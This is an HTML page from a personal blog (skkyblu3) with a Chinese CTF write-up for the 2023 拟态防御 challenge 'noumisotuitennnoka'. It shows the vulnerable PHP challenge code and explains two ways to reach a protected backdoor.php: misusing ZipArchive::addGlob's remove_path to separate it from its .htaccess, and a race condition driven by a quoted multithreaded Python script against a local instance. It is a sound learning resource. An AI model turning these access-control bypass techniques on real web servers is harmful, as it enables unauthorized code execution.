@@ -1,0 +1,388 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023拟态防御]noumisotuitennnoka | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023拟态防御]noumisotuitennnoka | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="题目环境
+index.php
+&lt;?php
+highlight_file(__FILE__);
+$dir = '/tmp';
+$htContent = &lt;&lt;&lt;EOT
+&lt;Files &quot;backdoor.p..." />
+    <meta name="keywords" content="条件竞争,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023拟态防御]noumisotuitennnoka
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-11-13
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/JCWJH-yQc/" class="post-tag">
+                  # 条件竞争
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-ni-tai-fang-yu-noumisotuitennnoka.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="题目环境">题目环境</h1>
+<p>index.php</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+$dir = '/tmp';
+$htContent = &lt;&lt;&lt;EOT
+&lt;Files &quot;backdoor.php&quot;&gt;
+    Deny from all
+&lt;/Files&gt;
+EOT;
+$action = $_GET['action'] ?? 'create';
+$content = $_GET['content'] ?? '&lt;?php echo file_get_contents(&quot;/flag&quot;);@unlink(__FILE__);';
+$subdir = $_GET['subdir'] ?? '/jsons';
+
+if(!preg_match('/^\/\.?[a-z]+$/', $subdir) || strlen($subdir) &gt; 10)
+    die(&quot;....&quot;);
+
+$jsonDir = $dir . $subdir;         
+$escapeDir = '/var/www/html' . $subdir;    
+$archiveFile = $jsonDir . '/archive.zip';  
+
+
+if($action == 'create'){
+    // create jsons/api.json
+    @mkdir($jsonDir);
+    file_put_contents($jsonDir. '/backdoor.php', $content);
+    file_put_contents($jsonDir. '/.htaccess',$htContent);
+}
+if($action == 'zip'){
+    delete($archiveFile);
+    // create archive.zip
+    $dev_dir = $_GET['dev'] ?? $dir;
+    if(realpath($dev_dir) !== $dir)
+        die('...');
+    $zip = new ZipArchive();
+    $zip-&gt;open($archiveFile, ZipArchive::CREATE);
+    $zip-&gt;addGlob($jsonDir . '/**', 0, ['add_path' =&gt; 'var/www/html/', 'remove_path' =&gt; $dev_dir]);
+    $zip-&gt;addGlob($jsonDir . '/.htaccess', 0, ['add_path' =&gt; 'var/www/html/', 'remove_path' =&gt; $dev_dir]);
+    $zip-&gt;close();
+}
+if($action == 'unzip' &amp;&amp; is_file($archiveFile)){
+    $zip = new ZipArchive();
+    $zip-&gt;open($archiveFile);
+    $zip-&gt;extractTo('/');
+    $zip-&gt;close();
+}
+if($action == 'clean'){
+    if (file_exists($escapeDir))
+        delete($escapeDir);
+    else
+        echo &quot;Failed.(/var/www/html)&quot;;
+    if (file_exists($jsonDir))
+        delete($jsonDir);
+    else
+        echo &quot;Failed.(/tmp)&quot;;
+}
+
+function delete($path){
+    if(is_file($path))
+        @unlink($path);
+    elseif (is_dir($path))
+        @rmdir($path);
+}
+</code></pre>
+<p>dockerfile</p>
+<pre><code class="language-dockerfile">FROM php:7.4-apache
+
+RUN apt-get update &amp;&amp; \
+    apt-get install -y \
+        libzip-dev \
+        zlib1g-dev \
+    &amp;&amp; rm -rf /var/lib/apt/lists/*
+
+RUN docker-php-ext-install zip
+
+COPY index.php /var/www/html/
+</code></pre>
+<p>build</p>
+<pre><code class="language-shell">docker build -t noumisotuitennnoka .
+</code></pre>
+<p>启动</p>
+<pre><code class="language-shell">docker run -itd -p 9988:80 noumisotuitennnoka2
+</code></pre>
+<h1 id="当时的思路">当时的思路</h1>
+<p>整个流程分析下来，很多参数的限制都很大。觉得最可疑的就是<code>$_GET['dev']</code>这个参数，它也是直接被用作<code>remove_path</code>传入的。</p>
+<p>搜了下<code>ZipArchive::addGlob</code>的用法，<code>remove_path</code>是添加到存档之前要从匹配的文件路径中删除的前缀，它是在<code>add_path</code>之前生效的。<br>
+<img src="https://skyblu3519.github.io/post-images/1699890979729.png" alt="" loading="lazy"></p>
+<p>测试当被压缩的文件位置在<code>/tmp/xxx</code>目录下，<code>remove_path</code>传入的参数为<code>/tmp/xxx/</code>，解压之后所有文件的第一个字符都被吞掉了。这样就可以让<code>.htaccess</code>失效<br>
+<img src="https://skyblu3519.github.io/post-images/1699890987597.png" alt="" loading="lazy"></p>
+<p>测试代码</p>
+<pre><code class="language-php">&lt;?php
+ini_set('display_errors','1');
+$dir = &quot;/tmp&quot;;
+$subdir = &quot;/xxx&quot;;
+$jsonDir = $dir . $subdir;
+$archiveFile = $jsonDir . '/archive.zip';
+
+$ksDir = '/tmp/xxx/';
+$action = 'unzip';
+//$action = 'zip';
+
+if($action == 'unzip'){
+    // create jsons/api.json
+    @mkdir($jsonDir);
+    file_put_contents($jsonDir. '/backdoor.php', &quot;123&quot;);
+    file_put_contents($jsonDir. '/.htaccess', &quot;123&quot;);
+}
+
+if($action == 'unzip') {
+    delete($archiveFile);
+    $zip = new ZipArchive();
+    $zip-&gt;open($archiveFile, ZipArchive::CREATE);
+    $zip-&gt;addGlob($jsonDir . '/**', 0, ['add_path' =&gt; 'html/', 'remove_path' =&gt; $ksDir]);
+    $zip-&gt;addGlob($jsonDir . '/.htaccess', 0, ['add_path' =&gt; 'html/', 'remove_path' =&gt; $ksDir]);
+    $zip-&gt;close();
+}
+
+if($action == 'unzip' &amp;&amp; is_file($archiveFile)){
+    $zip = new ZipArchive();
+    $zip-&gt;open($archiveFile);
+    $zip-&gt;extractTo('../');
+    $zip-&gt;close();
+}
+
+function delete($path){
+    if(is_file($path))
+        @unlink($path);
+    elseif (is_dir($path))
+        @rmdir($path);
+}
+</code></pre>
+<p><code>remove_path</code>确实有问题，但由于<code>if(realpath($dev_dir) !== $dir){dei('...');};</code>的限制，这样的思路只有压缩文件位置在<code>/tmp</code>目录下才能生效。</p>
+<p>但题目并不能让我们把文件写到<code>/tmp</code>目录下，而且后面测试也发现题目的网站根目录也没有可写权限。当时看这道题已经很晚了，最后也没有解出。</p>
+<h1 id="解法一">解法一</h1>
+<p>问题就在这个<code>remove_path</code>，因为没有源码，只有自己测试出来。</p>
+<p>当<code>remove_path</code>没有匹配到文件的路径的时候（比如<code>/tmp/xx1</code>），<code>remove_path</code>会失效文件的归档位置将不会改变。<br>
+<img src="https://skyblu3519.github.io/post-images/1699891009695.png" alt="" loading="lazy"></p>
+<p>当<code>remove_path</code>匹配了部分路径，比如文件位置为<code>/tmp/xxx/backdoor.php</code>，<code>remove_path=/xxx/b</code>，解压后文件的位置就会发生变化<br>
+<img src="https://skyblu3519.github.io/post-images/1699891015895.png" alt="" loading="lazy"></p>
+<p>甚至说不用匹配到有目录的位置，只要是这个路径字符串中任意一个字串（<code>ack</code>），都会让这个解压的路径发生改变。</p>
+<p>于是能在满足<code>if(realpath($dev_dir) !== $dir){dei('...');};</code>的限制下，我们在<code>/tmp/tmp</code>目录下生成文件，然后令<code>$dev_dir=/tmp/.</code>。这样文件路径<code>/tmp/tmp/.htaccess</code>就会通过<code>/tmp/.</code>来匹配到。进而让<code>backdoor.php</code>与<code>.htaccess</code>不在同一目录下。<br>
+<img src="https://skyblu3519.github.io/post-images/1699891063691.png" alt="" loading="lazy"></p>
+<p>然后访问<code>/tmp/tmp/backdoor.php</code>就行了。<br>
+<img src="https://skyblu3519.github.io/post-images/1699891070844.png" alt="" loading="lazy"></p>
+<h1 id="解法二">解法二</h1>
+<p>还有一种思路是用条件竞争，因为写入<code>backdoor.php</code>和<code>.htaccess</code>这个操作之间存在间隔。如果执行zip操作的时候，<code>.htaccess</code>还没写入。那么执行unzip的时候就不会有<code>.htaccess</code>存在，进而执行到<code>backdoor.php</code>。</p>
+<p>参考<a href="https://mp.weixin.qq.com/s?srcid=1113ODT6GuH9uBjVUnPlxsJa&amp;scene=23&amp;sharer_shareinfo=4f3dad286de5605dc78a51c0656bc2ce&amp;mid=2247502836&amp;poc_token=HA3aUWWj18YJXGXAD3ymQc7p4yRs6ZOoCWTqpMCr&amp;sn=7912b58906d3ab1bec93464917db3bfb&amp;idx=1&amp;sharer_shareinfo_first=4f3dad286de5605dc78a51c0656bc2ce&amp;__biz=MzUzMDUxNTE1Mw%3D%3D&amp;chksm=fa521e4acd25975cb0e305ba4fb9cda7121e0711fba80cf6058e2503bcb7efc8dce6cc93f479&amp;mpshare=1&amp;key=9a02cbd0e2b5c40a51759a2e9d2810fcbead91de35e485c905a0c0a215043c92053fb459e2400d720c8d5d6d7acdc2039e1414ba74a9895c3c438ec3d87b1c243f9eba8f47fd6646053b3d7e91b0667b059e2318e7952a2bf7c6f7774792c9ca01108d590c39d1c8bd9854fed95ed13fd0ce9a55c9f9fdc90a16069994c0e9ff&amp;ascene=0&amp;uin=MzM1MzE1MDAzOA%3D%3D&amp;devicetype=iMac+MacBookPro17%2C1+OSX+OSX+11.4+build(20F71)&amp;version=13080215&amp;nettype=WIFI&amp;lang=zh_CN&amp;countrycode=CN&amp;fontScale=100&amp;exportkey=n_ChQIAhIQJ8wvWAXWMfQ89Q%2FugGdJiRKAAgIE97dBBAEAAAAAAI6aAEe2sX8AAAAOpnltbLcz9gKNyK89dVj0wsEr70WnMinuGMiwApJeFlR6mmHZnIeOS75snQ%2BJUGkBgDwE0NqemaXFMHeI9XRX%2BUT2J0V1aOpxOi4pHSMWxvkqZkliOYSEGVyWgQTq%2B%2FZIHZvip7wOjUFSd%2BiDDSRiBoCLhDtxTBMWfFG26PRBk22HvUUuW2uZXInK6d%2BNDSZhOQKiWqddASx5HYWjZoETkpteZCpv3fN66ZT89CnBH8R7DVaPwROYX9ymKUwn896JfpmoQusY9j3UfZq8OmE4bgrMkFqV1E%2BRvAmvMxNqdMwPEMGVRSGCgsM%3D&amp;acctmode=0&amp;pass_ticket=2ISIn1tJ9TIy8QBQ0cuKIJC1XdB732xwuW6WE1NiaNr5RahzKXSGgMowReT8miNsXYIwOWPzUactv%2B9Qad9mag%3D%3D&amp;wx_header=0">山石战队的脚本</a></p>
+<pre><code class="language-python">import threading
+import requests
+
+url = &quot;http://127.0.0.1:9988/&quot;
+sess = requests.session()
+t = threading.Semaphore(80)
+
+def clean():
+    while True:
+        t.acquire()
+        p = {&quot;action&quot;: &quot;clean&quot;, &quot;subdir&quot;: &quot;/xxx&quot;}
+        sess.get(url, params=p)
+        t.release()
+
+def create():
+    while True:
+        t.acquire()
+        p = {&quot;action&quot;: &quot;create&quot;, &quot;subdir&quot;: &quot;/xxx&quot;}
+        sess.get(url, params=p)
+        t.acquire()
+
+
+def zip():
+    while True:
+        t.acquire()
+        p = {&quot;action&quot;: &quot;zip&quot;, &quot;subdir&quot;: &quot;/xxx&quot;}
+        sess.get(url, params=p)
+        t.acquire()
+
+
+def unzip():
+    while True:
+        t.acquire()
+        p = {&quot;action&quot;: &quot;unzip&quot;, &quot;subdir&quot;: &quot;/xxx&quot;}
+        sess.get(url, params=p)
+        t.acquire()
+
+
+threading.Thread(target=clean).start()
+threading.Thread(target=create).start()
+threading.Thread(target=create).start()
+threading.Thread(target=zip).start()
+threading.Thread(target=unzip).start()
+
+while True:
+    fh = sess.get(url + &quot;xxx/backdoor.php&quot;)
+    if fh.status_code != 403:
+        print(fh.text)
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1699891088167.png" alt="" loading="lazy"></figure>
+<h1 id="一点总结">一点总结</h1>
+<p>记这道到不说考了一个多牛的知识点，其实我感觉之后也不会看到<code>ZipArchive::addGlob</code>这玩意儿了。</p>
+<p>这道题给我感觉更像是一种随机应变吧，在网上无法直接搜到相关知识点，只有自己分析题目的话该怎么做。</p>
+<p>条件竞争不说了，之前确实接触的少。第一种解法现在看，在已经锁定了<code>dev</code>的问题之后，其实也可以反推它传入参数的可能性，这样说不定会想到的可能性大一点。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83">题目环境</a></li>
+<li><a href="#%E5%BD%93%E6%97%B6%E7%9A%84%E6%80%9D%E8%B7%AF">当时的思路</a></li>
+<li><a href="#%E8%A7%A3%E6%B3%95%E4%B8%80">解法一</a></li>
+<li><a href="#%E8%A7%A3%E6%B3%95%E4%BA%8C">解法二</a></li>
+<li><a href="#%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93">一点总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/k3s-shi-yong-metallb-zuo-wei-loadbalancer/">
+              <h3 class="post-title">
+                K3S 使用 MetalLB 作为 LoadBalancer
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
